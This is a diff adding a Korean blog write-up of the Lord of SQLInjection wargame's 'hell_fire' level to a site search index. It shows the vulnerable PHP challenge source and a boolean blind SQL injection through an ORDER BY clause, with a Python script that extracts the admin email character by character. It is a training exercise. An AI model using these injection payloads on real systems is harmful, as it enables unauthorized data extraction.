@@ -3446,4 +3446,166 @@ section 진행 기간
         <tag>Write UP</tag>
       </tags>
   </entry>
+  <entry>
+    <title>[Lord of SQLInjection] [23번_hell_fire] Write UP</title>
+    <url>/2021/11/27/2021-11-27-Lord_of_SQLInjection_23_hell_fire/</url>
+    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>
+
+<p>23번 문제인 hell_fire를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
+<br>
+
+<img src="/images/Lord of SQLInjection/hell_fire/source.png">
+
+<br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id,email,score from prob_hell_fire where 1 order by <span class="subst">&#123;$_GET[order]&#125;</span>&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$rows</span> = mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line">  <span class="keyword">while</span>((<span class="variable">$result</span> = mysqli_fetch_array(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[id]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[score]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select email from prob_hell_fire where id=&#x27;admin&#x27; and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) solve(<span class="string">&quot;hell_fire&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id,email,score from prob_hell_fire where 1 order by <span class="subst">&#123;$_GET[order]&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$result</span> = mysqli_fetch_array(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[id]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[score]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select email from prob_hell_fire where id=&#x27;admin&#x27; and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) solve(<span class="string">&quot;hell_fire&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>preg_match</code>라는 함수가 있습니다.</p>
+<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
+<p><code>pw 파라미터</code>에서 <code>prob</code> <code>proc</code> <code>union</code>  <code>_</code> <code>.</code>  를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
+<br>
+
+<br>
+
+<h2 id="6-줄-해석"><a href="#6-줄-해석" class="headerlink" title="6 줄 해석"></a>6 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>admin</code>의 <code>email</code>을 필터링하고있습니다.</p>
+<br>
+
+<br>
+
+<h2 id="11-줄-해석"><a href="#11-줄-해석" class="headerlink" title="11 줄 해석"></a>11 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br></pre></td></tr></table></figure>
+
+<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애 줍니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>
+
+<p><code>email</code>의 값을 찾아야 하는 <code>Blind SQLi</code>입니다.</p>
+<p><code>order by</code> 절을 이용하여 문제를 풀어야 합니다.</p>
+<br>
+
+<br>
+
+<p>저는 아래 사진과 같이 정렬 순서로 참 / 거짓을 판별하여 <code>email</code>을 찾아내었습니다.</p>
+<br>
+
+<img src="/images/Lord of SQLInjection/hell_fire/solve_1.png">
+
+<br>
+
+<p><code>if(조건, 참일 때 결과, 거짓일 때 결과)</code>를 사용해주면 됩니다.</p>
+<br>
+
+<p>참 일 때 결과를 <code>admin</code> 행이 첫 번째로 오도록 만들어주었고, 거짓일 때 <code>rubiya</code> 행이 첫 번째로 오도록 만들어주었습니다.</p>
+<br>
+
+<img src="/images/Lord of SQLInjection/hell_fire/solve_1.png">
+
+<br>
+
+<blockquote>
+<p>참</p>
+</blockquote>
+<br>
+
+<br>
+
+<img src="/images/Lord of SQLInjection/hell_fire/solve_2.png">
+
+<br>
+
+<blockquote>
+<p>거짓</p>
+</blockquote>
+<br>
+
+<br>
+
+<p><code>email</code>의 길이를 구하기 위한 쿼리문은 아래와 같습니다.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(id=&#x27;admin&#x27; and length(email)=&#x27;&#123; i &#125;&#x27;,1,3)%23</span><br></pre></td></tr></table></figure>
+
+<p><code>i</code> 값을 증가 시키면서 <code>email</code>의 길이를 구해주면 됩니다.</p>
+<br>
+
+<br>
+
+<p><code>email</code>의 길이를 구하면 한 글자 씩 추출하여 패스워드를 찾으면 됩니다.</p>
+<p><code>email</code>를 찾기 위한 쿼리문은 아래와 같습니다.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(id=&#x27;admin&#x27; and substr(email,&#123; i &#125;,1)=&#x27;&#123; j &#125;&#x27;,1,3)%23</span><br></pre></td></tr></table></figure>
+
+<p><code>substr</code> 함수로 한 글자 씩 추출하여 <code>pw</code>를 찾습니다.</p>
+<br>
+
+<br>
+
+<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=&quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">email = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;if(id=&#x27;admin&#x27; and length(email)=&#x27;&#123;&#125;&#x27;,1,3)%23&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&lt;td&gt;200&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;if(id=&#x27;admin&#x27; and substr(email,&#123;&#125;,1)=char(&#123;&#125;),1,3)%23&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), j)</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;td&gt;200&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            email += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(i,<span class="string">&quot;번째 문자 찾는 중 .. : &quot;</span>,email)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;EMAIL : &quot;</span>,email.lower())</span><br></pre></td></tr></table></figure>
+
+
+
+<br>
+
+<br>
+
+<img src="/images/Lord of SQLInjection/hell_fire/solve_3.png">
+
+<br>
+
+<p><code>email</code>의 길이입니다.</p>
+<br>
+
+<br>
+
+<img src="/images/Lord of SQLInjection/hell_fire/solve_4.png">
+
+<br>
+
+<p><code>email</code>를 한 글자 씩 추출하여 구해 줍니다.</p>
+<br>
+
+<br>
+
+<img src="/images/Lord of SQLInjection/hell_fire/solve_5.png">
+
+<br>
+
+<p>** 파이썬에서 패스워드가 대문자로 추출됩니다. 그 이유는 MySQL에서는 대소문자 구분이 없기 때문에 아스키 코드가 더 작은 대문자로 추출됩니다. 소문자로 바꿔주어 넣어주면 됩니다.</p>
+<br>
+
+<br>
+
+<blockquote>
+<p>SOLVED !!!</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Lord of SQLInjection</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Write UP</tag>
+      </tags>
+  </entry>
 </search>
